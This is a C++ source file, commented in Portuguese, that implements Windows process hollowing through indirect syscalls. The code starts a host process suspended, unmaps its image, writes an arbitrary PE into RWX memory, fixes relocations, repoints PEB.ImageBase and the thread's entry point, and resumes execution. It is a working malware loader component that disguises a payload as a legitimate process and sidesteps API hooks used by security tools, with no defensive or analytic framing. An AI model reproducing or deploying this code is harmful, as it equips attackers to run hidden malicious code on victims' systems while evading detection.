#include "../include/HollowingCore.h"
#include "../include/SyscallResolver.h"

#ifndef _M_X64
#error "PH requer build x64 (indirect syscalls sao x64-only)"
#endif

namespace Hollowing {

    // Wrappers - traduzem NTSTATUS para BOOL e adaptam signature NT p/ estilo Win32.

    static PVOID NtAllocate(HANDLE hProcess, PVOID preferred, SIZE_T size,
                            ULONG allocType, ULONG protect) {
        PVOID base = preferred;
        SIZE_T regionSize = size;
        NTSTATUS status = NtAllocateVirtualMemory_indirect(
            hProcess, &base, 0, &regionSize, allocType, protect);
        return (status >= 0) ? base : NULL;
    }

    static BOOL NtWrite(HANDLE hProcess, PVOID dest, PVOID src, SIZE_T size) {
        NTSTATUS status = NtWriteVirtualMemory_indirect(hProcess, dest, src, size, NULL);
        return (status >= 0);
    }

    static BOOL NtRead(HANDLE hProcess, PVOID src, PVOID dest, SIZE_T size) {
        NTSTATUS status = NtReadVirtualMemory_indirect(hProcess, src, dest, size, NULL);
        return (status >= 0);
    }

    /**
     * Process Hollowing via indirect syscalls.
     *
     * Passos:
     *   1. CreateProcessA (CREATE_SUSPENDED) - unica chamada Win32 obrigatoria
     *   2. NtGetContextThread + NtReadVirtualMemory (indirect) - le PEB.ImageBase
     *   3. NtUnmapViewOfSection (indirect) - desmapeia imagem original se colide
     *   4. NtAllocateVirtualMemory (indirect) - aloca no processo alvo
     *   5. NtWriteVirtualMemory (indirect) - escreve cabecalho + secoes
     *   6. FixRelocations se base != preferida
     *   7. NtWriteVirtualMemory (indirect) - patcheia PEB.ImageBaseAddress
     *   8. NtSetContextThread (indirect) - ajusta entry point
     *   9. NtResumeThread (indirect) - dispara execucao
     */
    bool HollowingCore::PerformHollowing(const std::string& targetPath, const PE_INFO& peInfo) {
        APIResolver& api = APIResolver::GetInstance();

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 1. Cria host suspenso (unica chamada Win32 aqui)
        if (!api.CreateProcessA(NULL, (LPSTR)targetPath.c_str(), NULL, NULL, FALSE,
                                CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return false;
        }

        // 2. Le ImageBase original do PEB do host
        ULONG_PTR remoteImageBase = 0;
        if (peInfo.is64Bit) {
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_FULL;
            if (NtGetContextThread_indirect(pi.hThread, &ctx) < 0) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            // x64: PEB em RDX, ImageBase em PEB+0x10
            if (!NtRead(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                        &remoteImageBase, sizeof(remoteImageBase))) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        } else {
            // Target 32-bit rodando em host 64-bit -> WOW64 context (Win32 API)
            WOW64_CONTEXT ctx = { 0 };
            ctx.ContextFlags = WOW64_CONTEXT_FULL;
            if (!api.Wow64GetThreadContext || !api.Wow64GetThreadContext(pi.hThread, &ctx)) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            // x86: PEB em EBX, ImageBase em PEB+0x8
            DWORD base32 = 0;
            if (!NtRead(pi.hProcess, (PVOID)(ULONG_PTR)(ctx.Ebx + 0x8),
                        &base32, sizeof(base32))) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
            remoteImageBase = base32;
        }

        ULONG_PTR imageBase = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.ImageBase
                                             : peInfo.ntHeaders32->OptionalHeader.ImageBase;
        DWORD imageSize = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.SizeOfImage
                                         : peInfo.ntHeaders32->OptionalHeader.SizeOfImage;

        // 3. Desmapeia imagem original se colide com base preferida do PE novo
        if (remoteImageBase == imageBase) {
            NtUnmapViewOfSection_indirect(pi.hProcess, (PVOID)remoteImageBase);
        }

        // 4. Aloca memoria no processo alvo
        PVOID remoteBase = NtAllocate(pi.hProcess, (PVOID)imageBase, imageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            remoteBase = NtAllocate(pi.hProcess, NULL, imageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteBase) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }

        // 5. Escreve cabecalho PE
        DWORD headerSize = peInfo.is64Bit ? peInfo.ntHeaders64->OptionalHeader.SizeOfHeaders
                                          : peInfo.ntHeaders32->OptionalHeader.SizeOfHeaders;
        if (!NtWrite(pi.hProcess, remoteBase, (PVOID)peInfo.data.data(), headerSize)) {
            api.TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Escreve cada secao
        DWORD ntHeadersSize = peInfo.is64Bit ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32);
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(
            peInfo.data.data() + peInfo.dosHeader->e_lfanew + ntHeadersSize);
        WORD numberOfSections = peInfo.is64Bit ? peInfo.ntHeaders64->FileHeader.NumberOfSections
                                               : peInfo.ntHeaders32->FileHeader.NumberOfSections;

        for (int i = 0; i < numberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData == 0) continue;
            PVOID dest = (PVOID)((ULONG_PTR)remoteBase + sectionHeader[i].VirtualAddress);
            PVOID src  = (PVOID)(peInfo.data.data() + sectionHeader[i].PointerToRawData);
            if (!NtWrite(pi.hProcess, dest, src, sectionHeader[i].SizeOfRawData)) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }

        // 6. Fixa relocations se base final != preferida
        ULONG_PTR delta = (ULONG_PTR)remoteBase - imageBase;
        if (delta != 0) {
            if (!FixRelocations(pi.hProcess, remoteBase, peInfo, delta)) {
                api.TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }

        // 7 + 8. Ajusta contexto do thread (entry point + PEB.ImageBaseAddress)
        ULONG_PTR entryPoint = (ULONG_PTR)remoteBase + (peInfo.is64Bit
            ? peInfo.ntHeaders64->OptionalHeader.AddressOfEntryPoint
            : peInfo.ntHeaders32->OptionalHeader.AddressOfEntryPoint);

        if (peInfo.is64Bit) {
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_FULL;
            NtGetContextThread_indirect(pi.hThread, &ctx);
            ctx.Rcx = entryPoint;
            NtWrite(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(remoteBase));
            NtSetContextThread_indirect(pi.hThread, &ctx);
        } else {
            WOW64_CONTEXT ctx = { 0 };
            ctx.ContextFlags = WOW64_CONTEXT_FULL;
            api.Wow64GetThreadContext(pi.hThread, &ctx);
            ctx.Eax = (DWORD)entryPoint;
            DWORD base32 = (DWORD)(ULONG_PTR)remoteBase;
            NtWrite(pi.hProcess, (PVOID)(ULONG_PTR)(ctx.Ebx + 0x8), &base32, sizeof(base32));
            api.Wow64SetThreadContext(pi.hThread, &ctx);
        }

        // 9. Resume via NtResumeThread indirect
        ULONG prev = 0;
        if (NtResumeThread_indirect(pi.hThread, &prev) < 0) {
            api.TerminateProcess(pi.hProcess, 0);
            return false;
        }

        NtClose_indirect(pi.hThread);
        NtClose_indirect(pi.hProcess);
        return true;
    }

    bool HollowingCore::FixRelocations(HANDLE hProcess, PVOID remoteBase,
                                      const PE_INFO& peInfo, ULONG_PTR delta) {
        IMAGE_DATA_DIRECTORY relocDir = peInfo.is64Bit
            ? peInfo.ntHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
            : peInfo.ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.Size == 0 || relocDir.VirtualAddress == 0) {
            return true;
        }

        DWORD relocOffset = 0;
        PIMAGE_SECTION_HEADER sectionHeader = peInfo.is64Bit
            ? IMAGE_FIRST_SECTION(peInfo.ntHeaders64)
            : IMAGE_FIRST_SECTION(peInfo.ntHeaders32);
        WORD numberOfSections = peInfo.is64Bit ? peInfo.ntHeaders64->FileHeader.NumberOfSections
                                               : peInfo.ntHeaders32->FileHeader.NumberOfSections;

        for (int i = 0; i < numberOfSections; i++) {
            if (sectionHeader[i].VirtualAddress <= relocDir.VirtualAddress &&
                relocDir.VirtualAddress < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                relocOffset = sectionHeader[i].PointerToRawData +
                              (relocDir.VirtualAddress - sectionHeader[i].VirtualAddress);
                break;
            }
        }

        if (relocOffset == 0) return false;

        DWORD parsedSize = 0;
        while (parsedSize < relocDir.Size) {
            PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(
                peInfo.data.data() + relocOffset + parsedSize);
            if (block->SizeOfBlock == 0) break;

            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD list = (PWORD)((ULONG_PTR)block + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < count; i++) {
                WORD type   = list[i] >> 12;
                WORD offset = list[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR address = (ULONG_PTR)remoteBase + block->VirtualAddress + offset;
                    ULONG_PTR value = 0;
                    SIZE_T size = peInfo.is64Bit ? 8 : 4;
                    if (!NtRead(hProcess, (PVOID)address, &value, size)) continue;
                    value += delta;
                    NtWrite(hProcess, (PVOID)address, &value, size);
                }
            }
            parsedSize += block->SizeOfBlock;
        }
        return true;
    }

    bool HollowingCore::FixImports(HANDLE hProcess, const PE_INFO& peInfo, PVOID remoteBase) {
        // Nao usado no fluxo principal - Ldr do sistema resolve IAT quando
        // PEB.ImageBaseAddress esta correto. Mantido apenas como referencia.
        (void)hProcess; (void)peInfo; (void)remoteBase;
        return true;
    }
}
